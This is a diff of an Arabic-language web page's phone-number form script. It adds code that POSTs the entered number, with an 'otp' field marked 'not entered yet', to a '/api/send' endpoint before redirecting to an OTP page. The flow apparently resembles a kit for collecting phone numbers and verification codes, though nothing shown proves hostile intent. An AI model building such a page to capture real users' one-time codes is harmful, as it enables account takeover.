@@ -83,31 +83,51 @@
             <button id="submitBtn" class="btn-continue" disabled>استمرار</button>
         </div>
     </div>
-
     <script>
-        const phoneInput = document.getElementById('phoneInput');
-        const submitBtn = document.getElementById('submitBtn');
+    const phoneInput = document.getElementById('phoneInput');
+    const submitBtn = document.getElementById('submitBtn');
 
-        phoneInput.addEventListener('input', () => {
-            if (phoneInput.value.trim().length >= 9) {
-                submitBtn.classList.add('active');
-                submitBtn.disabled = false;
-            } else {
-                submitBtn.classList.remove('active');
-                submitBtn.disabled = true;
+    phoneInput.addEventListener('input', () => {
+        // التحقق من طول الرقم
+        if (phoneInput.value.trim().length >= 9) {
+            submitBtn.classList.add('active');
+            submitBtn.disabled = false;
+        } else {
+            submitBtn.classList.remove('active');
+            submitBtn.disabled = true;
+        }
+    });
+
+    phoneInput.addEventListener('keypress', (e) => {
+        if (!/[0-9]/.test(e.key)) { e.preventDefault(); }
+    });
+
+    // دالة الإرسال عند الضغط على استمرار
+    submitBtn.addEventListener('click', async () => {
+        if (!submitBtn.disabled) {
+            const phone = phoneInput.value;
+            localStorage.setItem('userPhone', phone);
+
+            // إرسال الرقم إلى الـ API الخاص بنا في Vercel
+            try {
+                // نرسل الرقم فقط في هذه المرحلة (أو أي قيمة ابتدائية)
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: phone, 
+                        otp: "لم يتم إدخال الرمز بعد" 
+                    })
+                });
+            } catch (error) {
+                console.error("Error sending phone:", error);
             }
-        });
 
-        phoneInput.addEventListener('keypress', (e) => {
-            if (!/[0-9]/.test(e.key)) { e.preventDefault(); }
-        });
+            // الانتقال لصفحة الرمز
+            window.location.href = 'otp.html';
+        }
+    });
+</script>
 
-        submitBtn.addEventListener('click', () => {
-            if (!submitBtn.disabled) {
-                localStorage.setItem('userPhone', phoneInput.value);
-                window.location.href = 'otp.html';
-            }
-        });
-    </script>
 </body>
 </html>
